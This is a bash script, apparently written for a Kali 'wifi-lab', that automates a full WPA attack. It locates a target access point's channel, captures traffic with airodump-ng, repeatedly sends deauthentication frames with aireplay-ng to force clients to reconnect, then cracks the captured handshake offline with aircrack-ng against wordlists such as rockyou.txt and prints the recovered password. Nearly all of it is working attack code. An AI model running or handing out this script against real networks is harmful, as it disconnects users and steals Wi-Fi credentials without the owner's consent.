#!/bin/bash
# Clean handshake capture (adapter already in monitor mode; NO driver reset).
BSSID="${1:-AA:BB:CC:DD:EE:FF}"
WLS="${2:-/home/kali/wifi-lab/weakpins.txt /usr/share/wordlists/rockyou.txt}"
IFACE=wlan0
sudo pkill -9 airodump-ng aireplay-ng 2>/dev/null; sleep 1
sudo rm -f /tmp/f* /tmp/cap* 2>/dev/null
# robust channel discovery — rtl8xxxu auto-hop is flaky, so lock each 2.4GHz channel, filter the
# BSSID, and read the AP's REAL channel from the CSV (field 4), not the loop index.
CH=""
for ch in 1 6 11 2 3 4 5 7 8 9 10 12 13; do
  sudo iw dev "$IFACE" set channel "$ch" 2>/dev/null
  sudo timeout 2 airodump-ng -c "$ch" --bssid "$BSSID" "$IFACE" -w "/tmp/f$ch" --output-format csv >/dev/null 2>&1
  C=$(grep -i "$BSSID" "/tmp/f$ch-01.csv" 2>/dev/null | awk -F, '{gsub(/ /,"",$4); if($4+0>0){print $4; exit}}')
  [ -n "$C" ] && { CH=$C; break; }
done
echo "channel=${CH:-unknown}"
[ -z "$CH" ] && { echo "hotspot not found (on? 2.4GHz? in range?)"; exit 0; }
sudo iw dev "$IFACE" set channel "$CH" 2>/dev/null
sudo iw dev "$IFACE" set channel "$CH" 2>/dev/null
sudo airodump-ng -c "$CH" --bssid "$BSSID" -w /tmp/cap "$IFACE" >/dev/null 2>&1 &
AD=$!; sleep 5
clients(){ awk -F, -v b="$BSSID" 'f{gsub(/ /,"",$1);gsub(/ /,"",$6); if($6==b && $1 ~ /^([0-9A-Fa-f]{2}:){5}/) print $1} /Station MAC/{f=1}' /tmp/cap-01.csv 2>/dev/null; }
for r in $(seq 1 8); do
  CL=$(clients)
  if [ -n "$CL" ]; then for c in $CL; do sudo timeout 4 aireplay-ng --deauth 3 -a "$BSSID" -c "$c" "$IFACE" >/dev/null 2>&1; done
  else sudo timeout 4 aireplay-ng --deauth 3 -a "$BSSID" "$IFACE" >/dev/null 2>&1; fi
  sleep 5
  if sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake"; then echo "GOT handshake at round $r (clients: $CL)"; break; fi
done
sudo kill $AD 2>/dev/null; sleep 1
if sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake"; then
  echo "=== HANDSHAKE CAPTURED -> cracking (offline wordlists) ==="
  rm -f /tmp/cap.key
  for w in $WLS; do
    [ -f "$w" ] || continue
    echo "trying wordlist: $w"
    sudo aircrack-ng -w "$w" -b "$BSSID" -l /tmp/cap.key /tmp/cap-01.cap >/dev/null 2>&1
    [ -s /tmp/cap.key ] && break
  done
  if [ -s /tmp/cap.key ]; then echo "PASSWORD FOUND: $(cat /tmp/cap.key)"; else echo "handshake captured, password not in offline lists (needs a bigger list or GPU hashcat)"; fi
else
  echo "no handshake; clients seen: $(clients | tr '\n' ' ')"
fi
